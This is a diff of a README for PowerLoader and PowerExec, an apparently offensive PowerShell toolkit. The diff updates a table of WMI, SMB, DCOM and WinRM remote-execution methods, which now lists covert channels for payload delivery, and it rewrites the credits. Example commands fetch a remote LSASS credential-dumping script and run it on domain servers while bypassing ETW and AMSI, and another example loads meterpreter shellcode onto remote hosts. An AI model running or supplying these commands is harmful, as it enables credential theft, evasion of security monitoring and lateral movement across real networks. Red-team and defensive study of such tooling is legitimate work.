@@ -45,18 +45,18 @@ Bypass techniques can be specified within the function `New-PowerLoader`:
 
 The execution method must be specified within the function `Invoke-PowerExec`:
 
-| Method          | Description                                               | Run as              |
-| --------------- | --------------------------------------------------------- | ------------------- |
-| CimProcess      | Create process via WMI                                    | Current user        |
-| CimService      | Create temporary service via WMI                          | NT AUTHORITY\SYSTEM |
-| CimSubscription | Create temporary WMI event subscription (experimental)    | NT AUTHORITY\SYSTEM |
-| CimTask         | Create temporary scheduled task via WMI                   | NT AUTHORITY\SYSTEM |
-| SmbDcom         | Create DCOM instance leveraging SMB named pipe            | Current user        |
-| SmbService      | Create temporary service leveraging SMB named pipe        | NT AUTHORITY\SYSTEM |
-| SmbTask         | Create temporary scheduled task leveraging SMB named pipe | NT AUTHORITY\SYSTEM |
-| WinRM           | Run powershell via Windows Remote Management              | Current user        |
+| Method          | Description                                            | Covert channel               | Run as       |
+| --------------- | ------------------------------------------------------ | ---------------------------- | ------------ |
+| CimProcess      | Create process via WMI                                 | WMI property 'DebugFilePath' | Current user |
+| CimService      | Create temporary service via WMI                       | WMI property 'DebugFilePath' | SYSTEM       |
+| CimSubscription | Create temporary WMI event subscription (experimental) | WMI property 'DebugFilePath' | SYSTEM       |
+| CimTask         | Create temporary scheduled task via WMI                | WMI property 'DebugFilePath' | SYSTEM       |
+| SmbDcom         | Create DCOM instance via DCE/RPC                       | SMB named pipe               | Current user |
+| SmbService      | Create temporary service via DCE/RPC                   | SMB named pipe               | SYSTEM       |
+| SmbTask         | Create temporary scheduled task via DCE/RPC            | SMB named pipe               | SYSTEM       |
+| WinRM           | Run powershell via PowerShell Remoting                 | Windows Remote Management    | Current user |
 
-The execution output is retrieved regardless of the method used.
+Depending on the method used, a covert channel is established in order to deliver the payload and to retrieve execution output.
 
 Please note that multi-threading is supported for WinRM method only.
 For WMI/CIM methods, the transport protocol can be chosen between DCOM and WSMAN.
@@ -74,7 +74,7 @@ Run a PowerShell script on domain servers through WinRM while bypassing ETW and 
 
 ```
 PS C:\> $payload = New-PowerLoader -Type PoSh -FileUrl 'https://raw.githubusercontent.com/tmenochet/PowerDump/master/LsassDump.ps1' -ArgumentList 'Invoke-LsassDump' -Bypass ETW,AMSI
-PS C:\> Invoke-PowerExec -ScriptBlock $payload -Method WinRM -ComputerDomain ADATUM.CORP -ComputerFilter Servers -Theads 20
+PS C:\> Invoke-PowerExec -ScriptBlock $payload -Method WinRM -ComputerDomain ADATUM.CORP -ComputerFilter Servers -Threads 20
 ```
 
 Run a .NET assembly on remote hosts through WMI while bypassing ETW and AMSI:
@@ -91,11 +91,18 @@ PS C:\> New-PowerLoader -Type Shellcode -FilePath .\meterpreter.bin | Invoke-Pow
 ```
 
 
-## Credits
+## Acknowledgments
+
+PowerLoader is inspired by the following researches:
 
   * https://rastamouse.me/blog/asb-bypass-pt3/
   * https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
   * https://www.bc-security.org/post/powershell-logging-obfuscation-and-some-newish-bypasses-part-1/
   * https://blog.xpnsec.com/hiding-your-dotnet-etw
+
+PowerExec is inspired by the following researches:
+
   * https://www.fireeye.com/blog/threat-research/2017/03/wmimplant_a_wmi_ba.html
   * https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-1-wmi-event-subscription/
+  * https://blog.harmj0y.net/empire/expanding-your-empire/
+  * https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
